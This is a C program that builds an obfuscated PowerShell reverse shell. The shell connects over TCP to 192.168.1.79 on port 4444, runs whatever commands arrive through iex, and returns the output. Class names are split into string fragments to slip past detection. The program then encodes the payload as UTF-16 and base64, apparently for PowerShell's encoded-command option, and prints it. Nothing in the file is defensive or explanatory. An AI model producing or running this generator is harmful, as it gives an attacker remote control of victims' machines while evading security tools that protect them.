#include <openssl/evp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main() {
  char ps_payload[2048];
  const char *ip = "192.168.1.79";
  int port = 4444;
  snprintf(ps_payload, sizeof(ps_payload),
           "$cli=New-Object ('Net.Sock' + 'ets.TcpC' + 'lient')('%s',%d);"
           "$str=$cli.GetStream();"
           "[byte[]]$b=0..65535|%%{0};"
           "while(($i=$str.Read($b,0,$b.Length)) -ne 0){"
           "  $d=(New-Object -TypeName ('Text.ASC' + "
           "'IIEncoding')).GetString($b,0,$i);"
           "  $sb=(iex $d 2>&1|Out-String);"
           "  $sb2=$sb+'PS '+(pwd).Path+'> ';"
           "  $sb=([text.encoding]::ASCII).GetBytes($sb2);"
           "  $str.Write($sb,0,$sb.Length);"
           "  $str.Flush()"
           "}",
           ip, port);

  int payload_len = strlen(ps_payload);
  unsigned char *utf16 = malloc((payload_len + 1) * 2);
  for (int i = 0; i < payload_len; i++) {
    utf16[i * 2] = ps_payload[i];
    utf16[i * 2 + 1] = 0x00;
  }

  int b64_max_len = 4 * (((payload_len * 2) + 2) / 3) + 1;
  char *b64_payload = malloc(b64_max_len);
  int b64_written =
      EVP_EncodeBlock((unsigned char *)b64_payload, utf16, payload_len * 2);
  b64_payload[b64_written] = '\0';
  printf("%s\n", b64_payload);
  return 0;
}
